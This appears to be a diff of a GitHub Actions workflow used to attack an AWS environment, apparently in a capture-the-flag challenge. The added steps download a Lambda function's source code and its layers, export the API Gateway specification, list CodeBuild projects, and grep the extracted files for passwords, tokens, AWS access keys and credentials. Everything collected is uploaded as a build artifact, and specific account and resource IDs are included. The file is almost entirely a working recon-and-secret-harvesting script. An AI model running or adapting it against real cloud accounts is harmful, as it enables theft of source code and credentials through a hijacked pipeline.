@@ -20,61 +20,29 @@ jobs:
       - name: AWS identity
         run: aws sts get-caller-identity
 
-      - name: cicdRole - attached managed policies
+      - name: Describe VPC
         continue-on-error: true
         run: |
-          echo "===== cicdRole ATTACHED POLICIES ====="
-          aws iam list-attached-role-policies --role-name cicdRole
+          echo "===== VPC ====="
+          aws ec2 describe-vpcs --vpc-ids vpc-09328d3fa21dce320
 
-      - name: cicdRole - inline policies
+      - name: Get Lambda code location and download source
         continue-on-error: true
         run: |
-          echo "===== cicdRole INLINE POLICY NAMES ====="
-          aws iam list-role-policies --role-name cicdRole
-          for POLICY in $(aws iam list-role-policies --role-name cicdRole --query 'PolicyNames[]' --output text); do
-            echo "----- $POLICY -----"
-            aws iam get-role-policy --role-name cicdRole --policy-name "$POLICY"
-          done
+          echo "===== LAMBDA CODE LOCATION ====="
+          URL=$(aws lambda get-function --function-name nslookupv2 --query 'Code.Location' --output text)
+          echo "$URL"
+          curl -sL "$URL" -o code.zip
 
-      - name: cicdRole - trust policy
+      - name: Unzip and show handler
         continue-on-error: true
         run: |
-          echo "===== cicdRole TRUST POLICY ====="
-          aws iam get-role --role-name cicdRole --query 'Role.AssumeRolePolicyDocument'
-
-      - name: CTFExecutionRole - trust policy (who can assume it)
-        continue-on-error: true
-        run: |
-          echo "===== CTFExecutionRole TRUST POLICY ====="
-          aws iam get-role --role-name CTFExecutionRole --query 'Role.AssumeRolePolicyDocument'
-
-      - name: CTFExecutionRole - attached and inline policies
-        continue-on-error: true
-        run: |
-          echo "===== CTFExecutionRole ATTACHED POLICIES ====="
-          aws iam list-attached-role-policies --role-name CTFExecutionRole
-          echo "===== CTFExecutionRole INLINE POLICIES ====="
-          aws iam list-role-policies --role-name CTFExecutionRole
-          for POLICY in $(aws iam list-role-policies --role-name CTFExecutionRole --query 'PolicyNames[]' --output text); do
-            echo "----- $POLICY -----"
-            aws iam get-role-policy --role-name CTFExecutionRole --policy-name "$POLICY"
-          done
-
-      - name: lambdaRole - trust policy and policies
-        continue-on-error: true
-        run: |
-          echo "===== lambdaRole TRUST POLICY ====="
-          aws iam get-role --role-name lambdaRole --query 'Role.AssumeRolePolicyDocument'
-          echo "===== lambdaRole ATTACHED POLICIES ====="
-          aws iam list-attached-role-policies --role-name lambdaRole
-          echo "===== lambdaRole INLINE POLICIES ====="
-          aws iam list-role-policies --role-name lambdaRole
-
-      - name: Check for Lambda Function URL
-        continue-on-error: true
-        run: |
-          echo "===== FUNCTION URL CONFIG ====="
-          aws lambda get-function-url-config --function-name nslookupv2
+          mkdir -p extracted
+          unzip -o code.zip -d extracted
+          echo "===== FILES ====="
+          find extracted -type f
+          echo "===== lambda_function.py ====="
+          cat extracted/lambda_function.py || true
 
       - name: Check resource-based policy on the Lambda itself
         continue-on-error: true
@@ -82,36 +50,100 @@ jobs:
           echo "===== LAMBDA RESOURCE POLICY ====="
           aws lambda get-policy --function-name nslookupv2
 
-      - name: Check event source mappings
-        continue-on-error: true
-        run: |
-          echo "===== EVENT SOURCE MAPPINGS ====="
-          aws lambda list-event-source-mappings --function-name nslookupv2
+      # ===== API Gateway enumeration =====
 
-      - name: Check EventBridge rules targeting this Lambda
+      - name: API Gateway - get resources (all paths/methods)
         continue-on-error: true
         run: |
-          echo "===== EVENTBRIDGE RULES TARGETING nslookupv2 ====="
-          aws events list-rule-names-by-target \
-            --target-arn arn:aws:lambda:us-east-1:009661764077:function:nslookupv2
+          echo "===== API GATEWAY RESOURCES =====" 
+          aws apigateway get-resources --rest-api-id 3q931syi7b
 
-      - name: Check API Gateway REST APIs
+      - name: API Gateway - get stages
         continue-on-error: true
         run: |
-          echo "===== API GATEWAY (REST) ====="
-          aws apigateway get-rest-apis
+          echo "===== API GATEWAY STAGES ====="
+          aws apigateway get-stages --rest-api-id 3q931syi7b
 
-      - name: Check API Gateway HTTP APIs (v2)
+      - name: API Gateway - get dev stage detail
         continue-on-error: true
         run: |
-          echo "===== API GATEWAY (HTTP/v2) ====="
-          aws apigatewayv2 get-apis
+          echo "===== API GATEWAY STAGE: dev ====="
+          aws apigateway get-stage --rest-api-id 3q931syi7b --stage-name dev
 
-      - name: Check S3 bucket notification configs (possible S3-triggered invocation)
+      - name: API Gateway - export swagger spec
         continue-on-error: true
         run: |
-          echo "===== S3 BUCKET NOTIFICATION CONFIG ====="
-          for BUCKET in codec4f26c862a321ef5 platform-bucket-009661764077-us-east-1 site781fe43f26b9eba3; do
-            echo "----- $BUCKET -----"
-            aws s3api get-bucket-notification-configuration --bucket "$BUCKET"
-          done
+          echo "===== API GATEWAY SWAGGER EXPORT ====="
+          aws apigateway get-export \
+            --rest-api-id 3q931syi7b \
+            --stage-name dev \
+            --export-type swagger swagger.json
+          cat swagger.json 2>/dev/null || true
+
+      - name: API Gateway - list deployments
+        continue-on-error: true
+        run: |
+          echo "===== API GATEWAY DEPLOYMENTS ====="
+          aws apigateway get-deployments --rest-api-id 3q931syi7b
+
+      # ===== Lambda Layer extraction =====
+
+      - name: Get aws_cli_layer content
+        continue-on-error: true
+        run: |
+          echo "===== aws_cli_layer VERSION INFO ====="
+          aws lambda get-layer-version --layer-name aws_cli_layer --version-number 8
+          echo "===== Downloading aws_cli_layer content ====="
+          URL=$(aws lambda get-layer-version --layer-name aws_cli_layer --version-number 8 --query 'Content.Location' --output text)
+          curl -sL "$URL" -o aws_cli_layer.zip
+          mkdir -p aws_cli_layer_extracted
+          unzip -o aws_cli_layer.zip -d aws_cli_layer_extracted >/dev/null
+          echo "===== aws_cli_layer FILES ====="
+          find aws_cli_layer_extracted -maxdepth 4 -type f | head -100
+
+      - name: Get nslookup_layer content
+        continue-on-error: true
+        run: |
+          echo "===== nslookup_layer VERSION INFO ====="
+          aws lambda get-layer-version --layer-name nslookup_layer --version-number 8
+          echo "===== Downloading nslookup_layer content ====="
+          URL=$(aws lambda get-layer-version --layer-name nslookup_layer --version-number 8 --query 'Content.Location' --output text)
+          curl -sL "$URL" -o nslookup_layer.zip
+          mkdir -p nslookup_layer_extracted
+          unzip -o nslookup_layer.zip -d nslookup_layer_extracted >/dev/null
+          echo "===== nslookup_layer FILES ====="
+          find nslookup_layer_extracted -maxdepth 4 -type f | head -100
+
+      - name: Search extracted layers for secrets/scripts
+        continue-on-error: true
+        run: |
+          echo "===== Grepping layer contents for interesting strings ====="
+          grep -r -i -E "secret|password|key|token|AKIA|aws_access|aws_secret|flag|credential" \
+            aws_cli_layer_extracted nslookup_layer_extracted 2>/dev/null | head -100
+          echo "===== Listing any scripts (.sh, .py) in layers ====="
+          find aws_cli_layer_extracted nslookup_layer_extracted -type f \( -name "*.sh" -o -name "*.py" \) 2>/dev/null
+
+      # ===== CodeBuild recon =====
+
+      - name: CodeBuild - list and describe projects
+        continue-on-error: true
+        run: |
+          echo "===== CODEBUILD PROJECTS ====="
+          aws codebuild list-projects
+          PROJECTS=$(aws codebuild list-projects --query 'projects[]' --output text 2>/dev/null)
+          if [[ -n "$PROJECTS" ]]; then
+            aws codebuild batch-get-projects --names $PROJECTS
+          fi
+
+      - name: Upload all artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: recon-output
+          path: |
+            code.zip
+            extracted/
+            swagger.json
+            aws_cli_layer_extracted/
+            nslookup_layer_extracted/
+          if-no-files-found: ignore
